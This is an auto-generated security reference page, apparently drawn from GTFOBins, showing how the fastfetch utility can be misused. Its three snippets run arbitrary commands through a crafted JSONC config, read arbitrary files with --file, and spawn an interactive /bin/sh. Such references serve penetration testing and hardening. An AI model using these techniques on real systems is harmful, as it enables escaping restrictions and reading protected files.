---
parsed_by: focuslocust
source: commands
type: generated
---
# fastfetch Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## fastfetch

Tool page: [fastfetch](../../tools/linux/fastfetch.md)

### command

```text
echo '{"modules":[{"type":"command","key":"x","text":"exec /path/to/command"}]}' >/path/to/temp-file.jsonc
fastfetch -c /path/to/temp-file.jsonc
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/fastfetch` |
| Evidence | Function example preserved from source parser. |

### file-read

```text
fastfetch --file /path/to/input-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/fastfetch` |
| Evidence | Function example preserved from source parser. |

### shell

```text
echo '{"modules":[{"type":"command","key":"x","text":"exec /bin/sh 1>&0 2>&0"}]}' >/path/to/temp-file.jsonc
fastfetch -c /path/to/temp-file.jsonc
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/fastfetch` |
| Evidence | Function example preserved from source parser. |
